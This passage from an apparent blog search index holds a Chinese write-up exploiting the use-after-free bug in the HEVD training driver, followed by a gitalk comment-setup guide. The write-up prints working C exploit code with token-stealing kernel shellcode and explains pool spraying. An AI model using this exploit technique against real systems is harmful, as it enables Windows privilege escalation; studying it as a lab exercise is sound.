lpBytesReturned , NULL ); DeviceIoControl ( hevDevice , AllocateFakeUafObject , pfakeObject , sizeof ( FakeObject ), NULL , 0 , lpBytesReturned , NULL ); DeviceIoControl ( hevDevice , UseUafObject , noUseBuf , 0x4 , NULL , 0 , lpBytesReturned , NULL ); system ( whoami ); return 0 ; } \u8fd0\u884c\u8d77\u6765\u4e0b\u4e2a\u65ad\u70b9\u770b\u770b \u53ef\u4ee5\u770b\u5230\uff0cAlloc \u548c AllocFake \u7533\u8bf7\u7684\u975e\u6362\u9875\u6c60\u7684\u57fa\u5740\u662f\u4e00\u6a21\u4e00\u6837\u7684\u3002 \u5230\u8fd9\u91cc\u5176\u5b9e\u5df2\u7ecf\u89e3\u5b8c\u4e86\u3002\u89e3\u5b8c\u4e4b\u540e\u6211\u53c8\u60f3\u770b\u770b\u522b\u7684\u5e08\u5085\u662f\u600e\u4e48\u505a\u7684\uff0c\u7136\u540e\u6211\u5c31\u719f\u7ec3\u5730\u6253\u5f00\u4e86 rookit \u5e08\u5085\u7684\u535a\u5ba2 \u53ef\u4ee5\u770b\u5230\u4ed6\u7684\u65b9\u6cd5\u548c\u6211\u662f\u4e0d\u4e00\u6837\u7684\u3002\u867d\u7136\u5728\u8fd9\u91cc\u662f\u6ca1\u5fc5\u8981\u7528\u8fd9\u4e2a\u65b9\u6cd5\u7684\uff0c\u4f46\u662f\u82e5 Alloc \u548c AllocFake \u5206\u914d\u7684\u7a7a\u95f4\u57fa\u5740\u4e0d\u540c\u5462\uff0c\u6bd4\u5982\u8bf4\u4e24\u5757\u7a7a\u95f4\u4e0d\u4e00\u6837\u5927\u7684\u60c5\u51b5\u3002 \u8fd8\u8bb0\u5f97\u6211\u4eec\u5728\u6c60\u6ea2\u51fa\u4e00\u7ae0\u4e2d\u7528\u5230\u7684\u6c60\u55b7\u5c04\u5417\uff1f\u8fd9\u91cc\u4f7f\u7528\u7684\u662f IoCompletionReserve \u5bf9\u8c61\uff0c\u56e0\u4e3a IoCompletionReserve \u5728\u975e\u6362\u9875\u6c60\u4e2d\u7684\u5927\u5c0f\u6b63\u597d\u662f 0x60\u3002\uff08pool header + 0x58 = 0x60\uff09 IoCompletionReserve \u5bf9\u8c61\u53ef\u4ee5\u901a\u8fc7 NtAllocateReserveObject \u51fd\u6570\u6765\u83b7\u5f97\u3002 \u5c31\u50cf\u6211\u4eec\u5728\u6c60\u6ea2\u51fa\u4e00\u7ae0\u4e2d\u6240\u505a\u7684\u4e00\u6837\uff0c\u5148\u7528 10000 \u4e2a IoCompletionReserve \u5bf9\u8c61\u6765\u628a\u975e\u6362\u9875\u6c60\u4e2d\u7684\u788e\u7247\u586b\u6ee1\uff0c\u5c31\u7b97\u4e4b\u540e\u8fd8\u6709\u788e\u7247\u7684\u5b58\u5728\u4e5f\u653e\u4e0d\u4e0b\u6211\u4eec 0x60 \u4e2a\u5b57\u8282\u7684 Alloc \u5bf9\u8c61\u3002\u7136\u540e\u53ef\u4ee5\u8ba4\u4e3a\u4e4b\u540e\u5206\u914d\u7684 5000 \u4e2a IoCompletionReserve \u5bf9\u8c61\u662f\u8fde\u7eed\u7684\uff0c\u5728\u4e2d\u95f4\u6bcf\u9694\u4e00\u4e2a IoCompletionReserve \u5bf9\u8c61\u6316\u51fa\u4e00\u4e2a 0x60 \u4e2a\u5b57\u8282\u7684\u6d1e\u3002\u7136\u540e\u8c03\u7528 Alloc \u51fd\u6570\uff0c\u53ef\u4ee5\u8ba4\u4e3a Alloc \u51fd\u6570\u5206\u914d\u7684\u7a7a\u95f4\u662f\u6211\u4eec\u521a\u521a\u6316\u51fa\u7684\u5176\u4e2d\u4e00\u4e2a\u6d1e\u3002\u91ca\u653e\u6389 Alloc \u5bf9\u8c61\u4e4b\u540e\u7528 AllocFake \u5bf9\u8c61\u586b\u6ee1\u6240\u6709\u6316\u51fa\u6765\u7684\u6d1e\uff0c\u90a3\u4e48 g_UseAfterFreeObjectNonPagedPool \u6307\u9488\u4e00\u5b9a\u662f\u6307\u5411\u6211\u4eec\u7684 shellcode \u7684\uff0c\u6700\u540e\u8c03\u7528\u51fd\u6570 UseUaFObjectNonPagedPool \u89e6\u53d1\u6f0f\u6d1e\u6267\u884c shellcode \u5c31\u597d\u4e86\u3002\u6267\u884c\u5b8c shellcode \u4e4b\u540e\u8bb0\u5f97\u56de\u6536\u6211\u4eec\u521a\u521a\u5206\u914d\u7684\u6240\u6709\u7a7a\u95f4\u3002 \u5230\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u63d0\u6743\u6210\u529f\u4e86\u3002 0x03 \u7ed3\u675f\u8bed \u597d\u4e86\uff0c\u81f3\u6b64 HEVD \u9879\u76ee\u7684\u5b66\u4e60\u5c31\u544a\u4e00\u6bb5\u843d\u4e86\u3002 \u975e\u5e38\u611f\u8c22\u8be5\u9879\u76ee\u7684\u63d0\u4f9b\u8005\u3002HEVD \u786e\u5b9e\u662f\u4e00\u4e2a\u9002\u5408\u5b66\u4e60\u3001\u9002\u5408\u5165\u95e8\u7684\u9879\u76ee\uff0c\u6211\u5728\u8fd9\u4e9b\u5929\u7684\u8fc7\u7a0b\u4e2d\u786e\u5b9e\u5b66\u5230\u4e86\u5f88\u591a\u3002 \u4e4b\u540e\u4e00\u6bb5\u65f6\u95f4\u6253\u7b97\u7740\u624b\u4e8e CVE \u6f0f\u6d1e\u7684\u590d\u73b0\uff0c\u4e5f\u5c31\u662f\u5c06\u6f0f\u6d1e\u7684\u5206\u6790\u5229\u7528\u4ece\u5b66\u4e60\u73af\u5883\u632a\u5230\u771f\u5b9e\u73af\u5883\u4e0b\u4e86\uff0c\u5c06\u5e73\u53f0\u4ece x86 \u6269\u5c55\u5230 x64 \u73af\u5883\u4e0b\u3002 \u6700\u540e\uff0c\u770b\u770b\u81ea\u5df1\u6709\u6ca1\u6709\u90a3\u4e2a\u6c34\u5e73\u8d70\u4e0a\u6316\u6d1e\u7684\u8def\u4e86\u3002 \uff1a ) 2019.9.7","title":"\uff08\u4e03\uff09HEVD Use After Free"},{"location":"HEVD/useAfterFree/#0x00","text":"\u8fd9\u7bc7\u5c31\u662f HEVD \u7cfb\u5217\u7684\u6700\u540e\u4e00\u7bc7\u4e86\uff0c\u6709\u4e9b\u8bdd\u6211\u653e\u5728\u7ed3\u5c3e\u8bf4\u5427\u3002 \u672c\u7bc7\u7684\u5185\u5bb9\u4e3a Use After Free \u6f0f\u6d1e\u5206\u6790\u5229\u7528\u3002","title":"0x00 \u524d\u8a00"},{"location":"HEVD/useAfterFree/#0x01-use-after-free","text":"\u6309\u5957\u8def\u6211\u4eec\u5148\u6253\u5f00 UseAfterFreeNonPagedPool.c \u6587\u4ef6\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4ee3\u7801\u76f8\u5bf9\u4e4b\u524d\u505a\u7684\u7a0d\u5fae\u957f\u4e00\u70b9\uff0c\u4f46\u5176\u5b9e\u4e5f\u4e0d\u7b97\u957f\uff0c\u6bd5\u7adf\u5c31\u7b97\u662f wrk \u7684\u6587\u4ef6\u4e5f\u52a8\u4e0d\u52a8\u5c31\u662f\u597d\u51e0\u5343\u884c\u3002 \u8fd9\u91cc\u6211\u5c31\u4e0d\u89e3\u91ca\u6e90\u7801\u4e86\uff0c\u5927\u5bb6\u8ba4\u771f\u9605\u8bfb\u4e00\u4e0b\u5c31\u53ef\u4ee5\u77e5\u9053\u3002 \u53ef\u4ee5\u770b\u5230\uff0c\u6f0f\u6d1e\u53d1\u751f\u5728 Free \u51fd\u6570\u4e2d \u5f53\u6211\u4eec\u7528 Alloc \u51fd\u6570\u5728\u975e\u6362\u9875\u6c60\u4e2d\u5206\u914d\u5b8c\u7a7a\u95f4\u5e76\u4f7f g_UseAfterFreeObjectNonPagedPool \u6307\u5411\u8fd9\u6bb5\u7a7a\u95f4\u540e\uff0c\u5728 Free \u51fd\u6570\u7684\u65f6\u5019\u53ea\u91ca\u653e\u4e86\u8fd9\u6bb5\u975e\u6362\u9875\u6c60\u7a7a\u95f4\u4f46\u5e76\u6ca1\u6709\u5c06 g_UseAfterFreeObjectNonPagedPool \u6307\u9488\u7f6e NULL\u3002 \u518d\u770b\u5230 UseUaFObjectNonPagedPool \u51fd\u6570\u4e2d\uff0c\u82e5 g_UseAfterFreeObjectNonPagedPool \u4e0d\u4e3a NULL \u5c06\u6267\u884c g_UseAfterFreeObjectNonPagedPool- Callback() \u90a3\u4e48\u5229\u7528\u5c31\u5f88\u6e05\u6670\u4e86\uff0c\u6211\u4eec\u53ea\u9700\u8981 \u5229\u7528 Alloc \u51fd\u6570\u5206\u914d\u7a7a\u95f4\u5e76\u4f7f g_UseAfterFreeObjectNonPagedPool \u6307\u5411\u8be5\u6bb5\u7a7a\u95f4 \u8c03\u7528 Free \u51fd\u6570\u91ca\u653e\u8fd9\u6bb5\u7a7a\u95f4\uff0c\u4f46 g_UseAfterFreeObjectNonPagedPool \u4ecd\u7136\u6307\u5411\u8be5\u7a7a\u95f4 \u8c03\u7528 AllocFake \u6765\u4f7f\u9875\u9762\u53d8\u810f\uff0c\u4f7f g_UseAfterFreeObjectNonPagedPool - Callback \u7684\u4f4d\u7f6e\u53d8\u4e3a\u6211\u4eec shellcode \u7684\u5730\u5740 \u8c03\u7528 UseUaFObjectNonPagedPool \u89e6\u53d1 g_UseAfterFreeObjectNonPagedPool- Callback() \u6765\u6267\u884c\u6211\u4eec\u7684 shellcode","title":"0x01 Use After Free \u6f0f\u6d1e\u5206\u6790"},{"location":"HEVD/useAfterFree/#0x02-use-after-free","text":"\u8fd9\u91cc\u6709\u4e2a\u95ee\u9898\u5c31\u662f\uff0cFree \u51fd\u6570\u91ca\u653e\u6389\u7684 Alloc \u51fd\u6570\u5206\u914d\u7684\u7a7a\u95f4\u8ddf\u4e4b\u540e AllocFake \u5206\u914d\u7684\u7a7a\u95f4\u662f\u540c\u4e00\u5757\u5417\uff1f\uff08\u6ce8\u610f\u5230 Alloc \u548c AllocFake \u7533\u8bf7\u7684\u7a7a\u95f4\u5927\u5c0f\u662f\u76f8\u7b49\u7684\uff09 \u8fd9\u5c31\u6d89\u53ca\u5230 Windows \u7684\u5185\u5b58\u7ba1\u7406\u7b97\u6cd5\u4e86\u3002\u5176\u5b9e\u4f60\u91ca\u653e\u6389\u4e00\u5757\u7a7a\u95f4\u540e\u7acb\u9a6c\u53c8\u7533\u8bf7\u4e00\u5757\u5927\u5c0f\u76f8\u7b49\u7684\u7a7a\u95f4\u5185\u5b58\u7ba1\u7406\u5668\u662f\u503e\u5411\u4e8e\u5206\u914d\u540c\u4e00\u5757\u7a7a\u95f4\u7ed9\u4f60\u7684\u3002 \u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8fd9\u4e48\u4e00\u6bb5\u4ee3\u7801\u5c31\u80fd\u63d0\u6743\u4e86 // useAfterFree.cpp : Defines the entry point for the console application. // #include stdafx.h #include windows.h #define UseUafObject 0x222017 #define AllocateUafObject 0x222013 #define FreeUafObject 0x22201b #define AllocateFakeUafObject 0x22201f typedef struct _FAKE_OBJECT_NON_PAGED_POOL { char Buffer [ 0x58 ]; } FakeObject , * PFakeObject ; char shellcode [] = { \\x90\\x90\\x90\\x90 // NOP Sled \\x60 // pushad \\x31\\xc0 // xor eax,eax \\x64\\x8b\\x80\\x24\\x01\\x00\\x00 // mov eax,[fs:eax+0x124] \\x8b\\x40\\x50 // mov eax,[eax+0x50] \\x89\\xc1 // mov ecx,eax \\xba\\x04\\x00\\x00\\x00 // mov edx,0x4 \\x8b\\x80\\xb8\\x00\\x00\\x00 // mov eax,[eax+0xb8] \\x2d\\xb8\\x00\\x00\\x00 // sub eax,0xb8 \\x39\\x90\\xb4\\x00\\x00\\x00 // cmp [eax+0xb4],edx \\x75\\xed // jnz 0x1a \\x8b\\x90\\xf8\\x00\\x00\\x00 // mov edx,[eax+0xf8] \\x89\\x91\\xf8\\x00\\x00\\x00 // mov [ecx+0xf8],edx \\x61 // popad \\xC3 // ret }; int main () { LPVOID ptr = VirtualAlloc ( 0 , sizeof ( shellcode ), 0x3000 , 0x40 ); RtlCopyMemory ( ptr , shellcode , sizeof ( shellcode )); PFakeObject pfakeObject = ( PFakeObject ) malloc ( sizeof ( FakeObject )); memset ( pfakeObject , \\x42 , sizeof ( FakeObject )); * ( PDWORD ) pfakeObject = ( DWORD ) ptr ; int noUseBuf = 0x1 ; HANDLE hevDevice = CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , NULL , 0x3 , 0 , NULL ); DWORD lpBytesReturned = 0 ; DeviceIoControl ( hevDevice , AllocateUafObject , noUseBuf , 0x4 , NULL , 0 , lpBytesReturned , NULL ); DeviceIoControl ( hevDevice , FreeUafObject , noUseBuf , 0x4 , NULL , 0 , lpBytesReturned , NULL ); DeviceIoControl ( hevDevice , AllocateFakeUafObject , pfakeObject , sizeof ( FakeObject ), NULL , 0 , lpBytesReturned , NULL ); DeviceIoControl ( hevDevice , UseUafObject , noUseBuf , 0x4 , NULL , 0 , lpBytesReturned , NULL ); system ( whoami ); return 0 ; } \u8fd0\u884c\u8d77\u6765\u4e0b\u4e2a\u65ad\u70b9\u770b\u770b \u53ef\u4ee5\u770b\u5230\uff0cAlloc \u548c AllocFake \u7533\u8bf7\u7684\u975e\u6362\u9875\u6c60\u7684\u57fa\u5740\u662f\u4e00\u6a21\u4e00\u6837\u7684\u3002 \u5230\u8fd9\u91cc\u5176\u5b9e\u5df2\u7ecf\u89e3\u5b8c\u4e86\u3002\u89e3\u5b8c\u4e4b\u540e\u6211\u53c8\u60f3\u770b\u770b\u522b\u7684\u5e08\u5085\u662f\u600e\u4e48\u505a\u7684\uff0c\u7136\u540e\u6211\u5c31\u719f\u7ec3\u5730\u6253\u5f00\u4e86 rookit \u5e08\u5085\u7684\u535a\u5ba2 \u53ef\u4ee5\u770b\u5230\u4ed6\u7684\u65b9\u6cd5\u548c\u6211\u662f\u4e0d\u4e00\u6837\u7684\u3002\u867d\u7136\u5728\u8fd9\u91cc\u662f\u6ca1\u5fc5\u8981\u7528\u8fd9\u4e2a\u65b9\u6cd5\u7684\uff0c\u4f46\u662f\u82e5 Alloc \u548c AllocFake \u5206\u914d\u7684\u7a7a\u95f4\u57fa\u5740\u4e0d\u540c\u5462\uff0c\u6bd4\u5982\u8bf4\u4e24\u5757\u7a7a\u95f4\u4e0d\u4e00\u6837\u5927\u7684\u60c5\u51b5\u3002 \u8fd8\u8bb0\u5f97\u6211\u4eec\u5728\u6c60\u6ea2\u51fa\u4e00\u7ae0\u4e2d\u7528\u5230\u7684\u6c60\u55b7\u5c04\u5417\uff1f\u8fd9\u91cc\u4f7f\u7528\u7684\u662f IoCompletionReserve \u5bf9\u8c61\uff0c\u56e0\u4e3a IoCompletionReserve \u5728\u975e\u6362\u9875\u6c60\u4e2d\u7684\u5927\u5c0f\u6b63\u597d\u662f 0x60\u3002\uff08pool header + 0x58 = 0x60\uff09 IoCompletionReserve \u5bf9\u8c61\u53ef\u4ee5\u901a\u8fc7 NtAllocateReserveObject \u51fd\u6570\u6765\u83b7\u5f97\u3002 \u5c31\u50cf\u6211\u4eec\u5728\u6c60\u6ea2\u51fa\u4e00\u7ae0\u4e2d\u6240\u505a\u7684\u4e00\u6837\uff0c\u5148\u7528 10000 \u4e2a IoCompletionReserve \u5bf9\u8c61\u6765\u628a\u975e\u6362\u9875\u6c60\u4e2d\u7684\u788e\u7247\u586b\u6ee1\uff0c\u5c31\u7b97\u4e4b\u540e\u8fd8\u6709\u788e\u7247\u7684\u5b58\u5728\u4e5f\u653e\u4e0d\u4e0b\u6211\u4eec 0x60 \u4e2a\u5b57\u8282\u7684 Alloc \u5bf9\u8c61\u3002\u7136\u540e\u53ef\u4ee5\u8ba4\u4e3a\u4e4b\u540e\u5206\u914d\u7684 5000 \u4e2a IoCompletionReserve \u5bf9\u8c61\u662f\u8fde\u7eed\u7684\uff0c\u5728\u4e2d\u95f4\u6bcf\u9694\u4e00\u4e2a IoCompletionReserve \u5bf9\u8c61\u6316\u51fa\u4e00\u4e2a 0x60 \u4e2a\u5b57\u8282\u7684\u6d1e\u3002\u7136\u540e\u8c03\u7528 Alloc \u51fd\u6570\uff0c\u53ef\u4ee5\u8ba4\u4e3a Alloc \u51fd\u6570\u5206\u914d\u7684\u7a7a\u95f4\u662f\u6211\u4eec\u521a\u521a\u6316\u51fa\u7684\u5176\u4e2d\u4e00\u4e2a\u6d1e\u3002\u91ca\u653e\u6389 Alloc \u5bf9\u8c61\u4e4b\u540e\u7528 AllocFake \u5bf9\u8c61\u586b\u6ee1\u6240\u6709\u6316\u51fa\u6765\u7684\u6d1e\uff0c\u90a3\u4e48 g_UseAfterFreeObjectNonPagedPool \u6307\u9488\u4e00\u5b9a\u662f\u6307\u5411\u6211\u4eec\u7684 shellcode \u7684\uff0c\u6700\u540e\u8c03\u7528\u51fd\u6570 UseUaFObjectNonPagedPool \u89e6\u53d1\u6f0f\u6d1e\u6267\u884c shellcode \u5c31\u597d\u4e86\u3002\u6267\u884c\u5b8c shellcode \u4e4b\u540e\u8bb0\u5f97\u56de\u6536\u6211\u4eec\u521a\u521a\u5206\u914d\u7684\u6240\u6709\u7a7a\u95f4\u3002 \u5230\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u63d0\u6743\u6210\u529f\u4e86\u3002","title":"0x02 Use After Free \u6f0f\u6d1e\u5229\u7528"},{"location":"HEVD/useAfterFree/#0x03","text":"\u597d\u4e86\uff0c\u81f3\u6b64 HEVD \u9879\u76ee\u7684\u5b66\u4e60\u5c31\u544a\u4e00\u6bb5\u843d\u4e86\u3002 \u975e\u5e38\u611f\u8c22\u8be5\u9879\u76ee\u7684\u63d0\u4f9b\u8005\u3002HEVD \u786e\u5b9e\u662f\u4e00\u4e2a\u9002\u5408\u5b66\u4e60\u3001\u9002\u5408\u5165\u95e8\u7684\u9879\u76ee\uff0c\u6211\u5728\u8fd9\u4e9b\u5929\u7684\u8fc7\u7a0b\u4e2d\u786e\u5b9e\u5b66\u5230\u4e86\u5f88\u591a\u3002 \u4e4b\u540e\u4e00\u6bb5\u65f6\u95f4\u6253\u7b97\u7740\u624b\u4e8e CVE \u6f0f\u6d1e\u7684\u590d\u73b0\uff0c\u4e5f\u5c31\u662f\u5c06\u6f0f\u6d1e\u7684\u5206\u6790\u5229\u7528\u4ece\u5b66\u4e60\u73af\u5883\u632a\u5230\u771f\u5b9e\u73af\u5883\u4e0b\u4e86\uff0c\u5c06\u5e73\u53f0\u4ece x86 \u6269\u5c55\u5230 x64 \u73af\u5883\u4e0b\u3002 \u6700\u540e\uff0c\u770b\u770b\u81ea\u5df1\u6709\u6ca1\u6709\u90a3\u4e2a\u6c34\u5e73\u8d70\u4e0a\u6316\u6d1e\u7684\u8def\u4e86\u3002 \uff1a ) 2019.9.7","title":"0x03 \u7ed3\u675f\u8bed"},{"location":"misc/gitalkBuild/","text":"\u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\u54e6 : ) 0x00 \u524d\u8a00 \u641c\u4e86\u4e0b\u7f51\u4e0a\u597d\u50cf\u6ca1\u6709\u9488\u5bf9\u4e8e mkdocs-material \u7684 gitalk \u4f7f\u7528\u65b9\u6cd5\u3002\u4e8e\u662f\u81ea\u5df1\u4e00\u987f\u778e\u51e0\u628a\u64cd\u4f5c\u8fd8\u597d\u6700\u540e\u8fd8\u662f\u642d\u5efa\u6210\u529f\u4e86\uff0c\u8fd9\u7bc7\u6587\u7ae0\u5199\u7ed9\u540c\u6837\u60f3\u8981\u4f7f\u7528 mkdocs-material \u6765\u642d\u5efa gitalk \u7684\u8bfb\u8005\uff0c\u4ee5\u4f7f\u4f60\u4eec\u80fd\u8fc5\u901f\u5730\u642d\u5efa\u8d77 gitalk\u3002 0x01 \u4f7f\u7528 mkdocs-material \u642d\u5efa gitalk \u9996\u5148\u6211\u4eec\u9700\u8981\u8fd9\u4e48\u4e00\u6bb5\u4ee3\u7801 h2 id = __comments {{ lang.t( meta.comments ) }} / h2 form id = gitalk-form onsubmit = return false; div id = gitalk-container / div / form link rel = stylesheet href = https://unpkg.com/gitalk/dist/gitalk.css script src = https://unpkg.com/gitalk/dist/gitalk.min.js / script script src = https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js / script script const gitalk = new Gitalk ({ clientID : , // add yourself s clientSecret : , // add yourself s repo : comment , owner : 50u1w4y , admin : [ 50u1w4y ], id : md5 ( location . pathname ), // Ensure uniqueness and length less than 50 distractionFreeMode : false // Facebook-like distraction free mode }) gitalk . render ( gitalk-container ) / script \u5728\u4f60\u7684 github \u4e0b\u65b0\u5efa\u4e00\u4e2a\u4e13\u95e8\u7528\u6765\u653e\u8bc4\u8bba\u7684\u4ed3\u5e93 comment\uff0c\u5f53\u7136\u4f60\u53ef\u4ee5\u4f7f\u7528\u4efb\u4f55\u4ed3\u5e93\u3002 \u63a5\u4e0b\u6765\u7533\u8bf7 clientID \u548c clientSecret\u3002 \u70b9\u51fb\u8fd9\u4e2a\u94fe\u63a5 \u5c31\u53ef\u4ee5\u7533\u8bf7\u4e86\u3002 Application name \u53ef\u4ee5\u968f\u4fbf\u53d6\u4e2a\u540d\u5b57 Homepage URL \u5c31\u662f\u4f60\u535a\u5ba2\u7684\u4e3b\u9875\u5730\u5740 Authorization callback URL \u5c31\u662f\u522b\u4eba\u767b\u5f55\u5b8c\u4e4b\u540e\u7684\u56de\u8c03\u5730\u5740\uff0c\u4e00\u822c\u6765\u8bf4\u4fdd\u6301\u548c Homepage URL \u4e00\u6837\u5c31\u53ef\u4ee5\u4e86 \u7533\u8bf7\u5b8c\u4e4b\u540e\u628a\u5f97\u5230\u7684 clientID \u548c clientSecret \u586b\u5230\u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\u3002 \u63a5\u4e0b\u6765\u662f mkdocs-material \u7684\u642d\u5efa\u65b9\u6cd5\uff0c\u548c\u5176\u5b83\u6846\u67b6\u4f1a\u6709\u6240\u4e0d\u4e00\u6837\u3002 \u9996\u5148\u4f60\u5e94\u8be5\u5728\u672c\u5730\u5b89\u88c5\u597d\u4e86 mkdocs-material\u3002\u6ca1\u5b89\u88c5\u7684\u7528 pip \u5b89\u88c5\u4e00\u4e0b\u5c31\u597d\u4e86\u3002 \u7136\u540e\u770b\u5230\u8fd9\u4e2a\u8def\u5f84 \u7528\u521a\u521a\u7684\u4ee3\u7801\u8986\u76d6\u6389 disqus.html\uff0c\u6548\u679c\u7c7b\u4f3c\u4e8e(\u5047\u8bbe\u4ee3\u7801\u4fdd\u5b58\u5728\u6587\u4ef6 gitalk.html \u4e2d) cp .\\static\\gitalk.html F:\\python2\\Lib\\site-packages\\material\\partials\\integrations\\disqus.html \u8fd9\u65f6\u5019\u5230\u4f60\u7684\u535a\u5ba2\u7684\u6839\u8def\u5f84\u4e0b\u8fd0\u884c mkdocs build \u5c31\u597d\u4e86\uff0c\u4f60\u53ef\u4ee5\u770b\u5230\u751f\u6210\u7684 site \u6587\u4ef6\u5939\u4e0b\u7684\u9875\u9762\u6587\u4ef6\u4e2d\u5305\u542b\u4e86\u4e0a\u9762\u7684\u4ee3\u7801 \u6b64\u65f6\u8bbf\u95ee\u4e00\u4e0b\u81ea\u5df1\u7684\u535a\u5ba2\u5c31\u53ef\u4ee5\u770b\u5230 gitalk \u529f\u80fd\u4e86 0x03 \u7ed3\u675f\u8bed \u5176\u5b9e\u5728\u5b66\u4e60\u7684\u8fc7\u7a0b\u4e2d\u4f1a\u5f88\u7ecf\u5e38\u9047\u5230\u4e00\u4e9b\u7f51\u4e0a\u641c\u7d22\u4e0d\u5230\u7684\u5185\u5bb9\uff0c\u50cf\u8fd9\u79cd\u6709\u8ff9\u53ef\u5faa\u7684\u8fd8\u597d\u8bf4\uff0c\u90a3\u79cd\u65e0\u8ff9\u53ef\u5bfb\u53c8\u6ca1\u4eba\u80fd\u95ee\u7684\u60c5\u51b5\u624d\u662f\u771f\u7684\u96be\u9876\u3002 2019.8.29","title":"mkdocs-material \u642d\u5efa gitalk"},{"location":"misc/gitalkBuild/#0x00","text":"\u641c\u4e86\u4e0b\u7f51\u4e0a\u597d\u50cf\u6ca1\u6709\u9488\u5bf9\u4e8e mkdocs-material \u7684 gitalk \u4f7f\u7528\u65b9\u6cd5\u3002\u4e8e\u662f\u81ea\u5df1\u4e00\u987f\u778e\u51e0\u628a\u64cd\u4f5c\u8fd8\u597d\u6700\u540e\u8fd8\u662f\u642d\u5efa\u6210\u529f\u4e86\uff0c\u8fd9\u7bc7\u6587\u7ae0\u5199\u7ed9\u540c\u6837\u60f3\u8981\u4f7f\u7528 mkdocs-material \u6765\u642d\u5efa gitalk \u7684\u8bfb\u8005\uff0c\u4ee5\u4f7f\u4f60\u4eec\u80fd\u8fc5\u901f\u5730\u642d\u5efa\u8d77 gitalk\u3002","title":"0x00 \u524d\u8a00"},{"location":"misc/gitalkBuild/#0x01-mkdocs-material-gitalk","text":"\u9996\u5148\u6211\u4eec\u9700\u8981\u8fd9\u4e48\u4e00\u6bb5\u4ee3\u7801 h2 id = __comments {{ lang.t( meta.comments ) }} / h2 form id = gitalk-form onsubmit = return false; div id = gitalk-container / div / form link rel = stylesheet href = https://unpkg.com/gitalk/dist/gitalk.css script src = https://unpkg.com/gitalk/dist/gitalk.min.js / script script src = https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js / script script const gitalk = new Gitalk ({ clientID : , // add yourself s clientSecret : , // add yourself s repo : comment , owner : 50u1w4y , admin : [ 50u1w4y ], id : md5 ( location . pathname ), // Ensure uniqueness and length less than 50 distractionFreeMode : false // Facebook-like distraction free mode }) gitalk . render ( gitalk-container ) / script \u5728\u4f60\u7684 github \u4e0b\u65b0\u5efa\u4e00\u4e2a\u4e13\u95e8\u7528\u6765\u653e\u8bc4\u8bba\u7684\u4ed3\u5e93 comment\uff0c\u5f53\u7136\u4f60\u53ef\u4ee5\u4f7f\u7528\u4efb\u4f55\u4ed3\u5e93\u3002 \u63a5\u4e0b\u6765\u7533\u8bf7 clientID \u548c clientSecret\u3002 \u70b9\u51fb\u8fd9\u4e2a\u94fe\u63a5 \u5c31\u53ef\u4ee5\u7533\u8bf7\u4e86\u3002 Application name \u53ef\u4ee5\u968f\u4fbf\u53d6\u4e2a\u540d\u5b57 Homepage URL \u5c31\u662f\u4f60\u535a\u5ba2\u7684\u4e3b\u9875\u5730\u5740 Authorization callback URL \u5c31\u662f\u522b\u4eba\u767b\u5f55\u5b8c\u4e4b\u540e\u7684\u56de\u8c03\u5730\u5740\uff0c\u4e00\u822c\u6765\u8bf4\u4fdd\u6301\u548c Homepage URL \u4e00\u6837\u5c31\u53ef\u4ee5\u4e86 \u7533\u8bf7\u5b8c\u4e4b\u540e\u628a\u5f97\u5230\u7684 clientID \u548c clientSecret \u586b\u5230\u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\u3002 \u63a5\u4e0b\u6765\u662f mkdocs-material \u7684\u642d\u5efa\u65b9\u6cd5\uff0c\u548c\u5176\u5b83\u6846\u67b6\u4f1a\u6709\u6240\u4e0d\u4e00\u6837\u3002 \u9996\u5148\u4f60\u5e94\u8be5\u5728\u672c\u5730\u5b89\u88c5\u597d\u4e86 mkdocs-material\u3002\u6ca1\u5b89\u88c5\u7684\u7528 pip \u5b89\u88c5\u4e00\u4e0b\u5c31\u597d\u4e86\u3002 \u7136\u540e\u770b\u5230\u8fd9\u4e2a\u8def\u5f84 \u7528\u521a\u521a\u7684\u4ee3\u7801\u8986\u76d6\u6389 disqus.html\uff0c\u6548\u679c\u7c7b\u4f3c\u4e8e(\u5047\u8bbe\u4ee3\u7801\u4fdd\u5b58\u5728\u6587\u4ef6 gitalk.html \u4e2d) cp .\\static\\gitalk.html F:\\python2\\Lib\\site-packages\\material\\partials\\integrations\\disqus.html \u8fd9\u65f6\u5019\u5230\u4f60\u7684\u535a\u5ba2\u7684\u6839\u8def\u5f84\u4e0b\u8fd0\u884c mkdocs build \u5c31\u597d\u4e86\uff0c\u4f60\u53ef\u4ee5\u770b\u5230\u751f\u6210\u7684 site \u6587\u4ef6\u5939\u4e0b\u7684\u9875\u9762\u6587\u4ef6\u4e2d\u5305\u542b\u4e86\u4e0a\u9762\u7684\u4ee3\u7801 \u6b64\u65f6\u8bbf\u95ee\u4e00\u4e0b\u81ea\u5df1\u7684\u535a\u5ba2\u5c31\u53ef\u4ee5\u770b\u5230 gitalk \u529f\u80fd\u4e86","title":"0x01 \u4f7f\u7528 mkdocs-material \u642d\u5efa gitalk"},{"location":"misc/gitalkBuild/#0x03","text":"\u5176\u5b9e\u5728\u5b66\u4e60\u7684\u8fc7\u7a0b\u4e2d\u4f1a\u5f88\u7ecf\u5e38\u9047\u5230\u4e00\u4e9b\u7f51\u4e0a\u641c\u7d22\u4e0d\u5230\u7684\u5185\u5bb9\uff0c\u50cf\u8fd9\u79cd\u6709\u8ff9\u53ef\u5faa\u7684\u8fd8\u597d\u8bf4\uff0c\u90a3\u79cd\u65e0\u8ff9\u53ef\u5bfb\u53c8\u6ca1\u4eba\u80fd\u95ee\u7684\u60c5\u51b5\u624d\u662f\u771f\u7684\u96be\u9876\u3002 2019.8.29","title":"0x03 